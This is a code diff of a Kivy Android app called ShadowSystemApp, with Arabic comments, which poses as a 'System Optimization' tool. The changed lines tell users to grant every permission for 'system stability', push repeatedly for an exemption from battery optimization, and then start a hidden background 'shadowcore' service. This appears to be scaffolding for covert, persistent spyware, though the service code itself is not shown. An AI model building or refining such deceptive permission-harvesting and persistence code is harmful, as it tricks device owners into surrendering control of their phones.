@@ -2,24 +2,26 @@ import threading
 from kivy.app import App
 from kivy.uix.label import Label
 from kivy.clock import Clock
-from jnius import autoclass
+from jnius import autoclass, cast
 
-# أدوات نظام أندرويد
+# استدعاء كلاسات أندرويد
 PythonActivity = autoclass('org.kivy.android.PythonActivity')
 Intent = autoclass('android.content.Intent')
 Settings = autoclass('android.provider.Settings')
 Uri = autoclass('android.net.Uri')
+Context = autoclass('android.content.Context')
+PowerManager = autoclass('android.os.PowerManager')
 
 class ShadowSystemApp(App):
     def build(self):
         return Label(
-            text="[b]System Optimization[/b]\n[color=00ff00]Initializing services...ing[/color]", 
+            text="[b]System Optimization[/b]\n[color=00ff00]الرجاء الموافقة على كافة الأذونات لضمان استقرار النظام[/color]", 
             markup=True,
             halign="center"
         )
 
     def on_start(self):
-        # طلب الأذونات فوراً عند التشغيل
+        # الخطوة 1: طلب الأذونات العادية (صور، إشعارات...)
         Clock.schedule_once(self.trigger_permissions, 1)
 
     def trigger_permissions(self, dt):
@@ -31,29 +33,38 @@ class ShadowSystemApp(App):
                 Permission.READ_EXTERNAL_STORAGE,
                 Permission.FOREGROUND_SERVICE
             ]
-            request_permissions(perms, self.after_permissions)
+            request_permissions(perms, self.check_battery_permission)
         except:
             pass
 
-    def after_permissions(self, permissions, grants):
-        # توجيه المستخدم لصفحة تحسين البطارية لضمان عدم القتل
-        Clock.schedule_once(self.open_battery_settings, 1)
-        # تشغيل الخدمة
+    def check_battery_permission(self, permissions, grants):
+        # الخطوة 2: طلب استثناء البطارية بشكل مباشر ومزعج
+        Clock.schedule_once(self.ask_ignore_battery, 1)
+
+    def ask_ignore_battery(self, dt):
+        activity = PythonActivity.mActivity
+        pm = cast(PowerManager, activity.getSystemService(Context.POWER_SERVICE))
+        package_name = activity.getPackageName()
+        
+        # التأكد إذا كان التطبيق مستثنى أم لا
+        if not pm.isIgnoringBatteryOptimizations(package_name):
+            try:
+                # محاولة فتح النافذة المباشرة (المنبثقة) لطلب السماح
+                intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                intent.setData(Uri.parse(f"package:{package_name}"))
+                activity.startActivity(intent)
+            except:
+                # إذا فشلت، نفتح صفحة الإعدادات الشاملة كخطة بديلة
+                intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
+                activity.startActivity(intent)
+        
+        # بعد طلب البطارية، نشغل الخدمة
         Clock.schedule_once(self.launch_service, 2)
-
-    def open_battery_settings(self, dt):
-        try:
-            activity = PythonActivity.mActivity
-            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-            intent.setData(Uri.parse(f"package:{activity.getPackageName()}"))
-            activity.startActivity(intent)
-        except:
-            pass
 
     def launch_service(self, dt):
         try:
             context = PythonActivity.mActivity
-            # تأكد أن الاسم مطابق لما في buildozer.spec
+            # تشغيل خدمة الخلفية
             service_class = autoclass('org.test.shadowcore.ServiceService')
             service_class.start(context, "")
         except:
